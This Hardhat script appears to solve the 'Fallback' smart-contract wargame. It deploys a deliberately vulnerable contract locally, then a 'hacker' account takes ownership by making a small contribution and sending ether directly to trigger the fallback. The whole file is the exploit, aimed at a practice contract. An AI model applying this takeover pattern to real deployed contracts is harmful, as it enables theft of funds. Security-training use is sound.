const hre = require("hardhat");

async function main() {
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();
  await fallback.deployed();

  const [ownerDeployer, hacker] = await hre.ethers.getSigners();

  await fallback.connect(hacker).contribute({value: ethers.utils.parseEther("0.0001")});
  await hacker.sendTransaction({
    to: fallback.address,
    value: ethers.utils.parseEther("1"),
  });

  console.log(hacker.address == await fallback.owner())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
